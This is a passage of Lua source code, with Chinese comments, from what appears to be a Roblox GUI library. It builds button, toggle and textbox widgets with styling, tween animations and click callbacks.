            Arrow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Arrow.BackgroundTransparency = 1.000
            Arrow.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Arrow.BorderSizePixel = 0
            Arrow.Position = UDim2.new(0.980000019, 0, 0.5, 0)
            Arrow.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
            Arrow.SizeConstraint = Enum.SizeConstraint.RelativeYY
            Arrow.ZIndex = 11
            Arrow.Image = "rbxassetid://10709791437"
            Arrow.ImageTransparency = 0.150

            Button.Name = "Button"
            Button.Parent = ButtonBlock
            Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Button.BackgroundTransparency = 1.000
            Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Button.BorderSizePixel = 0
            Button.Size = UDim2.new(1, 0, 1, 0)
            Button.ZIndex = 15
            Button.Font = Enum.Font.SourceSans
            Button.TextColor3 = Color3.fromRGB(0, 0, 0)
            Button.TextSize = 14.000
            Button.TextTransparency = 1.000

            Library:MakeDrop(ButtonBlock, UIStroke, Library.Colors.Hightlight)

            if setup.Tip then
                WindowLibrary:AddToolTip(ButtonBlock, tostring(setup.Tip));
            end;

            Button.MouseButton1Down:Connect(function()
                Library:Tween(Arrow, Library.TweenLibrary.SmallEffect, {
                    Position = UDim2.new(0.999, 0, 0.5, 0),
                    ImageTransparency = 0.4
                })
            end)

            Button.MouseButton1Up:Connect(function()
                Library:Tween(Arrow, Library.TweenLibrary.SmallEffect, {
                    Position = UDim2.new(0.980000019, 0, 0.5, 0),
                    ImageTransparency = 0.15
                })
            end)

            Button.MouseButton1Click:Connect(function()
                setup.Callback()
            end)
    
            local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                ButtonBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock()
    
            local RootSkid = {};
    
            function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

            function RootSkid:Value(Setup)
                TextLabel.Text = Setup
                UpdateBlock()
            end;

            function RootSkid:Fire(...)
                return setup.Callback(...);
            end;

            function RootSkid:Title(title)
                TextLabel.Text = title;
                UpdateBlock()
            end;

            function RootSkid:Visible(value)
                ButtonBlock.Visible = value;
            end;

            return RootSkid;
        end;
------ // 切换按钮[原ui]   ----------------------------------------------------------------------------------------
        function Root:Toggle(setup)
			setup = setup or {};

			setup.Title = setup.Title or "切换按钮"
			setup.Content = setup.Content or "";
			setup.Default = setup.Default or false;
			setup.Callback = setup.Callback or function() end;
			
		    local ToggleBlock = Instance.new("Frame") -- 切换按钮的外框
		    local DropShadow = Instance.new("ImageLabel") -- 用于创建阴影效果图标签
		    local UIStroke = Instance.new("UIStroke") -- UI边框
		    local TextLabel = Instance.new("TextLabel") -- 文本标签
		    local Content = Instance.new("TextLabel")
		    local Block = Instance.new("Frame") -- 背景框
		    local UIStroke_2 = Instance.new("UIStroke") -- 背景框的边框
		    local UICorner = Instance.new("UICorner") -- 用于创建圆角效果
		    local ValueBlock = Instance.new("Frame") -- 值框
		    local UICorner_2 = Instance.new("UICorner") -- 值框的圆角效果
		    local Button = Instance.new("TextButton") -- 按钮
		    
			ToggleBlock.Name = "ToggleBlock"
			ToggleBlock.Parent = ScrollingFrame
			ToggleBlock.BackgroundColor3 = Library.Colors.Default
			ToggleBlock.BackgroundTransparency = 0.250
			ToggleBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ToggleBlock.BorderSizePixel = 0
			ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			ToggleBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = ToggleBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = ToggleBlock

			TextLabel.RichText = true
			TextLabel.Parent = ToggleBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			
			Content.Name = "Content"
            Content.Parent = ToggleBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true			

			Block.Name = "Block"
			Block.Parent = ToggleBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 35, 0.5, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(5, 100)
			UICorner.Parent = Block

			ValueBlock.Name = "ValueBlock"
			ValueBlock.Parent = Block
			ValueBlock.AnchorPoint = Vector2.new(0.5, 0.5)
			ValueBlock.BackgroundColor3 = Library.Colors.Hightlight
			ValueBlock.BackgroundTransparency = 0.250
			ValueBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ValueBlock.BorderSizePixel = 0
			ValueBlock.Position = UDim2.new(0.75, 0, 0.5, 0)
			ValueBlock.Size = UDim2.new(0.99000001, 0, 0.99000001, 0)
			ValueBlock.SizeConstraint = Enum.SizeConstraint.RelativeYY
			ValueBlock.ZIndex = 15

            UICorner_2.CornerRadius = UDim.new(1, 0)
            UICorner_2.Parent = ValueBlock

			Button.Name = "Button"
			Button.Parent = ToggleBlock
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 15
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			Library:MakeDrop(ToggleBlock , UIStroke , Library.Colors.Hightlight)

			if setup.Tip then
				WindowLibrary:AddToolTip(ToggleBlock , tostring(setup.Tip));
			end;

			local UILib = function(value)
				if value then
					Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
						Position = UDim2.new(0.75, 0, 0.5, 0),
						BackgroundColor3 = Library.Colors.Hightlight
					})
				else
					Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
						Position = UDim2.new(0.25, 0, 0.5, 0),
						BackgroundColor3 = Library.Colors.Disable
					})
				end;
			end;

			UILib(setup.Default);

			Button.MouseButton1Click:Connect(function()
				setup.Default = not setup.Default;

				UILib(setup.Default);

				setup.Callback(setup.Default)
			end)
			
			local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock()

			local RootSkid = {};
			
			function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

			function RootSkid:Value(Setup)
				setup.Default = Setup
				UILib(setup.Default);
				setup.Callback(setup.Default)
				UpdateBlock()
			end;

			function RootSkid:Visible(value)
				ToggleBlock.Visible = value;
			end;

			return RootSkid;
		end;
------ // 切换按钮[1]   ----------------------------------------------------------------------------------------
		function Root:A1Toggle(setup)
			setup = setup or {};
			setup.Title = setup.Title or "切换按钮[1]"
			setup.Content = setup.Content or "";
			setup.Default = setup.Default or false;
			setup.Callback = setup.Callback or function() end;

		    local A1ToggleBlock = Instance.new("Frame")
		    local DropShadow = Instance.new("ImageLabel")
		    local UIStroke = Instance.new("UIStroke")
		    local TextLabel = Instance.new("TextLabel")
		    local Content = Instance.new("TextLabel")
		    local Block = Instance.new("Frame")
		    local UIStroke_2 = Instance.new("UIStroke")
		    local UICorner = Instance.new("UICorner")
		    local ValueBlock = Instance.new("Frame")
		    local UICorner_2 = Instance.new("UICorner")
		    local Button = Instance.new("TextButton")
		    local TriangleImage = Instance.new("ImageLabel")
		    
			A1ToggleBlock.Name = "A1ToggleBlock"
			A1ToggleBlock.Parent = ScrollingFrame
			A1ToggleBlock.BackgroundColor3 = Library.Colors.Default
			A1ToggleBlock.BackgroundTransparency = 0.250
			A1ToggleBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			A1ToggleBlock.BorderSizePixel = 0
			A1ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			A1ToggleBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = A1ToggleBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = A1ToggleBlock

			TextLabel.RichText = true
			TextLabel.Parent = A1ToggleBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			
			Content.Name = "Content"
            Content.Parent = A1ToggleBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true			

			Block.Name = "Block"
			Block.Parent = A1ToggleBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 35, 0.5, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(5, 100)
			UICorner.Parent = Block			

            -- 设置ValueBlock的属性
            ValueBlock.Name = "ValueBlock"
            ValueBlock.Parent = Block
            ValueBlock.AnchorPoint = Vector2.new(0.5, 0.5)
            ValueBlock.BackgroundColor3 = Library.Colors.Hightlight
            ValueBlock.BackgroundTransparency = 1.000
            ValueBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
            ValueBlock.BorderSizePixel = 0
            ValueBlock.Position = UDim2.new(0.75, 0, 0.5, 0)
            ValueBlock.Size = UDim2.new(0.99000001, 0, 0.99000001, 0)
            ValueBlock.SizeConstraint = Enum.SizeConstraint.RelativeYY
            ValueBlock.ZIndex = 15

            TriangleImage.Name = "Triangle"
            TriangleImage.Parent = ValueBlock
            TriangleImage.AnchorPoint = Vector2.new(0.5, 0.5)
            TriangleImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TriangleImage.BackgroundTransparency = 1.000
            TriangleImage.Position = UDim2.new(0.5, 0, 0.5, 0)
            TriangleImage.Size = UDim2.new(1, 0, 1, 0)
            TriangleImage.Image = "rbxassetid://102797584513959"
            TriangleImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
            TriangleImage.ScaleType = Enum.ScaleType.Fit
            
            UICorner_2.CornerRadius = UDim.new(1, 0)
            UICorner_2.Parent = TriangleImage
            
			Button.Name = "Button"
			Button.Parent = A1ToggleBlock
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 15
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000			

			Library:MakeDrop(A1ToggleBlock , UIStroke , Library.Colors.Hightlight)

			if setup.Tip then
				WindowLibrary:AddToolTip(A1ToggleBlock , tostring(setup.Tip));
			end;

            local UILib = function(value)
                if value then
                     Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
                         Position = UDim2.new(0.75, 0, 0.5, 0),
                    })
                    TriangleImage.Rotation = 0
                else
                    Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
                        Position = UDim2.new(0.25, 0, 0.5, 0),
                    })
                    TriangleImage.Rotation = 180
                end;
                ValueBlock.BackgroundColor3 = value and Library.Colors.Hightlight or Library.Colors.Disable
            end;

			UILib(setup.Default);

			Button.MouseButton1Click:Connect(function()
				setup.Default = not setup.Default;

				UILib(setup.Default);

				setup.Callback(setup.Default)
			end)
			
		    local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10 
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                A1ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock()

			local RootSkid = {};
			
			function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

			function RootSkid:Value(Setup)
				setup.Default = Setup
				UILib(setup.Default);
				setup.Callback(setup.Default)
				UpdateBlock()
			end;

			function RootSkid:Visible(value)
				A1ToggleBlock.Visible = value;
			end;

			return RootSkid;
		end;
------ // 切换按钮[2]   ----------------------------------------------------------------------------------------
		function Root:A2Toggle(setup)
			setup = setup or {};

			setup.Title = setup.Title or "切换按钮[2]"
			setup.Content = setup.Content or "";
			setup.Default = setup.Default or false;
			setup.Callback = setup.Callback or function() end;

		    local A2ToggleBlock = Instance.new("Frame")
		    local DropShadow = Instance.new("ImageLabel") 
		    local UIStroke = Instance.new("UIStroke") 
		    local TextLabel = Instance.new("TextLabel") 
		    local Content = Instance.new("TextLabel")
		    local Block = Instance.new("Frame")
		    local UIStroke_2 = Instance.new("UIStroke")
		    local UICorner = Instance.new("UICorner")
		    local ValueBlock = Instance.new("Frame")
		    local UICorner_2 = Instance.new("UICorner")
		    local Button = Instance.new("TextButton")
		    local StateImage = Instance.new("ImageLabel")
		    
			A2ToggleBlock.Name = "A2ToggleBlock"
			A2ToggleBlock.Parent = ScrollingFrame
			A2ToggleBlock.BackgroundColor3 = Library.Colors.Default
			A2ToggleBlock.BackgroundTransparency = 0.250
			A2ToggleBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			A2ToggleBlock.BorderSizePixel = 0
			A2ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			A2ToggleBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = A2ToggleBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = A2ToggleBlock

			TextLabel.RichText = true
			TextLabel.Parent = A2ToggleBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			
			Content.Name = "Content"
            Content.Parent = A2ToggleBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true			

			Block.Name = "Block"
			Block.Parent = A2ToggleBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 35, 0.5, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(5, 100)
			UICorner.Parent = Block
			
            ValueBlock.Name = "ValueBlock"
            ValueBlock.Parent = Block
            ValueBlock.AnchorPoint = Vector2.new(0.5, 0.5)
            ValueBlock.BackgroundColor3 = Library.Colors.Hightlight
            ValueBlock.BackgroundTransparency = 1.000 
            ValueBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
            ValueBlock.BorderSizePixel = 0
            ValueBlock.Position = UDim2.new(0.75, 0, 0.5, 0)
            ValueBlock.Size = UDim2.new(0.99000001, 0, 0.99000001, 0)
            ValueBlock.SizeConstraint = Enum.SizeConstraint.RelativeYY
            ValueBlock.ZIndex = 15
            
            StateImage.Name = "StateImage"
            StateImage.Parent = ValueBlock
            StateImage.AnchorPoint = Vector2.new(0.5, 0.5)
            StateImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            StateImage.BackgroundTransparency = 1.000
            StateImage.Position = UDim2.new(0.5, 0, 0.5, 0)
            StateImage.Size = UDim2.new(1, 0, 1, 0)
            StateImage.Image = "rbxassetid://123698784885744"
            StateImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
            StateImage.ScaleType = Enum.ScaleType.Fit

            UICorner_2.CornerRadius = UDim.new(1, 0)
            UICorner_2.Parent = StateImage

			Button.Name = "Button"
			Button.Parent = A2ToggleBlock
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 15
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			Library:MakeDrop(A2ToggleBlock , UIStroke , Library.Colors.Hightlight)

			if setup.Tip then
				WindowLibrary:AddToolTip(A2ToggleBlock , tostring(setup.Tip));
			end;
			
            local UILib = function(value)
                if value then
                    Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
                        Position = UDim2.new(0.75, 0, 0.5, 0),
                    })
                    StateImage.Image = "rbxassetid://88666635012556"
                else
                    Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
                        Position = UDim2.new(0.25, 0, 0.5, 0),
                    })
                    StateImage.Image = "rbxassetid://123698784885744"
                end;
                ValueBlock.BackgroundColor3 = value and Library.Colors.Hightlight or Library.Colors.Disable
            end;

			UILib(setup.Default);

			Button.MouseButton1Click:Connect(function()
				setup.Default = not setup.Default;

				UILib(setup.Default);

				setup.Callback(setup.Default)
			end)
			
			local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10 
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5 
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                A2ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock()

			local RootSkid = {};
			
			function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

			function RootSkid:Value(Setup)
				setup.Default = Setup
				UILib(setup.Default);
				setup.Callback(setup.Default)
				UpdateBlock()
			end;

			function RootSkid:Visible(value)
				A2ToggleBlock.Visible = value;
			end;

			return RootSkid;
		end;
------ // 输入框   ----------------------------------------------------------------------------------------
		function Root:Textbox(setup)
			setup = setup or {};
			setup.Title = setup.Title or '输入框';
			setup.Content = setup.Content or "";
			setup.PlaceHolder = setup.PlaceHolder or '';
			setup.Default = setup.Default or '';
			setup.Callback = setup.Callback or function() end;
			setup.Numeric = setup.Numeric or false;

			local TextBoxBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local TextBox = Instance.new("TextBox")

			TextBoxBlock.Name = "TextBoxBlock"
			TextBoxBlock.Parent = ScrollingFrame
			TextBoxBlock.BackgroundColor3 = Library.Colors.Default
			TextBoxBlock.BackgroundTransparency = 0.250
			TextBoxBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextBoxBlock.BorderSizePixel = 0
			TextBoxBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			TextBoxBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = TextBoxBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = TextBoxBlock

			TextLabel.Parent = TextBoxBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
